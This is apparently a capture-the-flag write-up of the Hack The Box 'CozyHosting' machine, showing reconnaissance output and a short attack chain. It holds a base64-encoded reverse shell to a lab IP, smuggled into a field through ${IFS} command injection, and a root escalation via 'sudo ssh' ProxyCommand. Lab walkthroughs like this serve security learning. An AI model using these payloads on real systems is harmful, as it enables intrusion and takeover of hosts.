# CozyHosting Write-up

<img src="https://labs.hackthebox.com/storage/avatars/eaed7cd01e84ef5c6ec7d949d1d61110.png" width="200" height="200">

-----------------------------------------------------------------------------------------------------------------------

Main page `cozyhosting.htb`

![image](https://github.com/zer00d4y/writeups/assets/128820441/a4d4d8d3-0a22-4a11-b907-14606c4f2c14)


# Nmap 

`nmap -sC -sV cozyhosting.htb` 

    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
    |_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)
    |_http-title: Did not follow redirect to http://cozyhosting.htb
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Dirsearch

`python3 dirsearch.py -u http://cozyhosting.htb`

    ┌──(kali㉿kali)-[~/tools/dirsearch]
    └─$ python3 dirsearch.py -u http://cozyhosting.htb/                
    
      _|. _ _  _  _  _ _|_    v0.4.3
     (_||| _) (/_(_|| (_| )
    
    Starting: 
    200 -    0B  - /;/admin                                          
    200 -    0B  - /;/login
    200 -    0B  - /;/json
    200 -    0B  - /;admin/
    200 -    0B  - /;login/
    200 -    0B  - /;json/                                    
    200 -  634B  - /actuator                                         
    200 -    0B  - /actuator/;/auditLog
    200 -    0B  - /actuator/;/auditevents
    200 -    0B  - /actuator/;/beans
    200 -    0B  - /actuator/;/caches
    200 -    0B  - /actuator/;/conditions
    200 -    0B  - /actuator/;/dump
    200 -    0B  - /actuator/;/configurationMetadata
    200 -    0B  - /actuator/;/env
    200 -    0B  - /actuator/;/events
    200 -    0B  - /actuator/;/exportRegisteredServices
    200 -    0B  - /actuator/;/configprops
    200 -    0B  - /actuator/;/health
    200 -    0B  - /actuator/;/heapdump
    200 -    0B  - /actuator/;/features
    200 -    0B  - /actuator/;/httptrace
    200 -    0B  - /actuator/;/jolokia
    200 -    0B  - /actuator/;/flyway
    200 -    0B  - /actuator/;/logfile
    200 -    0B  - /actuator/;/loggers
    200 -    0B  - /actuator/;/healthcheck
    200 -    0B  - /actuator/;/metrics
    200 -    0B  - /actuator/;/info
    200 -    0B  - /actuator/;/registeredServices
    200 -    0B  - /actuator/;/integrationgraph
    200 -    0B  - /actuator/;/refresh
    200 -    0B  - /actuator/;/liquibase
    200 -    0B  - /actuator/;/loggingConfig
    200 -    0B  - /actuator/;/mappings
    200 -    0B  - /actuator/;/sessions
    200 -    0B  - /actuator/;/releaseAttributes
    200 -    0B  - /actuator/;/resolveAttributes
    200 -    0B  - /actuator/;/sso
    200 -    0B  - /actuator/;/springWebflow
    200 -    0B  - /actuator/;/scheduledtasks
    200 -    0B  - /actuator/;/statistics
    200 -    0B  - /actuator/;/shutdown
    200 -    0B  - /actuator/;/status
    200 -    0B  - /actuator/;/trace
    200 -    0B  - /actuator/;/threaddump                            
    200 -    0B  - /actuator/;/prometheus                            
    200 -    0B  - /actuator/;/ssoSessions                           
    200 -    5KB - /actuator/env                                     
    200 -   15B  - /actuator/health
    200 -   10KB - /actuator/mappings                                
    200 -   98B  - /actuator/sessions
    200 -  124KB - /actuator/beans                                                                            
    200 -    0B  - /admin/%3bindex/                                  
    200 -    0B  - /admin;/                                          
    200 -    0B  - /Admin;/                                          
    200 -    0B  - /axis//happyaxis.jsp                              
    200 -    0B  - /axis2-web//HappyAxis.jsp                         
    200 -    0B  - /axis2//axis2-web/HappyAxis.jsp
    200 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js
    200 -    0B  - /engine/classes/swfupload//swfupload.swf          
    200 -    0B  - /engine/classes/swfupload//swfupload_f9.swf                                                
    200 -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/ 
    200 -    0B  - /extjs/resources//charts.swf                      
    200 -    0B  - /html/js/misc/swfupload//swfupload.swf            
    200 -    0B  - /jkstatus;                                        
    200 -    4KB - /login                                            
    200 -    0B  - /login.wdm%2e                                     
    204 -    0B  - /logout                                           
                                                                                 
    Task Completed    

/actuator/sessions

![image](https://github.com/zer00d4y/writeups/assets/128820441/c0473b62-97c5-4e15-811b-b35915afe6d0)

login page

![image](https://github.com/zer00d4y/writeups/assets/128820441/a635bf81-f568-43ef-9dc9-1e255cd231c1)

![image](https://github.com/zer00d4y/writeups/assets/128820441/bdf6f862-c771-4181-8e95-240d76a9d9f6)

![image](https://github.com/zer00d4y/writeups/assets/128820441/99c5b146-96c8-47a1-873c-815d6e85ace9)

![image](https://github.com/zer00d4y/writeups/assets/128820441/49cdc566-a6a5-47a5-b110-1bdd848dd63b)

![image](https://github.com/zer00d4y/writeups/assets/128820441/0255c3c8-adef-4cb5-adb3-8e2fab06ca28)

![image](https://github.com/zer00d4y/writeups/assets/128820441/1c0f1101-2178-4863-84c7-4e5003277972)

![image](https://github.com/zer00d4y/writeups/assets/128820441/d31e8ad4-a152-49c0-bcc5-29da465d70cb)

![image](https://github.com/zer00d4y/writeups/assets/128820441/83fb39b1-f380-43c4-bee5-c15feb3ca8b8)

![image](https://github.com/zer00d4y/writeups/assets/128820441/d29fba97-e038-42c8-9245-ac74b2c3d120)

`echo "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjYyLzc3NyAwPiYx"| base64 | bash`

`;$(echo${IFS}"L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjYyLzc3NyAwPiYx"|${IFS}base64${IFS}-d${IFS}|${IFS}bash);`

![image](https://github.com/zer00d4y/writeups/assets/128820441/d4d94e81-6e3b-4e1b-a253-0edb88c55b39)

![image](https://github.com/zer00d4y/writeups/assets/128820441/e95222cd-6e59-40cf-ba6c-134af8bd49a9)

![image](https://github.com/zer00d4y/writeups/assets/128820441/ff18da37-ed48-4323-9ba6-cd7e3c24e35f)

![image](https://github.com/zer00d4y/writeups/assets/128820441/63dff361-f552-4c64-9ece-47daf9d48e92)

![image](https://github.com/zer00d4y/writeups/assets/128820441/fe19f79f-aad6-45ef-94b5-4258da0abea4)

![image](https://github.com/zer00d4y/writeups/assets/128820441/67aa73c6-4be3-4a09-84c4-c55fca1f9634)

![image](https://github.com/zer00d4y/writeups/assets/128820441/799423fb-6205-42fe-98b1-971d1d872066)

![image](https://github.com/zer00d4y/writeups/assets/128820441/b06e1cf5-55ce-4c17-90e5-a165630730a7)

![image](https://github.com/zer00d4y/writeups/assets/128820441/76c5022f-7362-438d-bceb-abee0508028e)

# PrivEsc via LinPEAS

github: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

https://github.com/carlospolop/PEASS-ng/releases/download/20240226-e0f9d47b/linpeas.sh

`wget https://github.com/carlospolop/PEASS-ng/releases/download/20240226-e0f9d47b/linpeas.sh`

![image](https://github.com/zer00d4y/writeups/assets/128820441/1657048e-b830-4341-a053-6e39bf94139a)

![image](https://github.com/zer00d4y/writeups/assets/128820441/4637b630-d74e-403a-956c-9dfb8a6524ea)

![image](https://github.com/zer00d4y/writeups/assets/128820441/6cb8f88a-b2d6-429c-8564-5b53777af1c4)

![image](https://github.com/zer00d4y/writeups/assets/128820441/dfa0772c-1294-4a83-8109-10be76e76c84)

` sudo ssh -o ProxyCommand=';bash 0<&2 1>&2' x`

![image](https://github.com/zer00d4y/writeups/assets/128820441/22064478-83c6-4666-9c7e-ae05d4c7df12)


